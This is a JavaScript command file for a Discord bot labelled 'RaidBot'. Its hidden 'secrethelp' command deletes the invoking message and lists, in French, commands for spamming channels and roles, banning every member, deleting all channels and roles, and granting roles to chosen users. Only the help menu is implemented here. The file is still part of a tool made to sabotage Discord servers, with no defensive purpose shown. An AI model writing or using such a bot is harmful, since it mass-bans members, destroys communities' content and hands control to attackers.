const Commando = require("discord.js-commando");
const Discord = require("discord.js");

module.exports = class HelpCommand extends Commando.Command {
  constructor(client) {
    super(client, {
      name: "secrethelp",
      group: "misc",
      memberName: "secrethelp",
      description: "Sends a list of available command",
      guildOnly: true,
    });
  }

  async run(message) {
    message.delete();
    const embed = new Discord.MessageEmbed()
      .setColor("#000001")
      .setAuthor("Help Command")
      .setFooter("RaidBot")
      .addFields(
        {
          name: "`.secrethelp`",
          value: "Montre la liste des commandes disponibles",
        },
        {
          name: "`.stc 50`",
          value: "Spam 50 salons",
        },
        {
          name: "`.spamroles 50`",
          value: "Spam 50 roles",
        },
        {
          name: "`.banall`",
          value: "Ban tout le monde",
        },
        {
          name: "`.delchannels <Channel name 1> <Channel name 2> ...`",
          value: "Supprimes tous les salons",
        },
        {
          name: "`.delroles`",
          value: "Supprimes tous les roles",
        },
        {
          name: "`.setadmin <@User> <Role name>`",
          value: "Ajoute un rôle à quelqu'un",
        }
      );
    message.channel.send(embed);

    const moment = require("moment");
    const time = moment().format("HH:mm:ss a");
    console.log(`${time} | Command Ran: help`);
  }
};
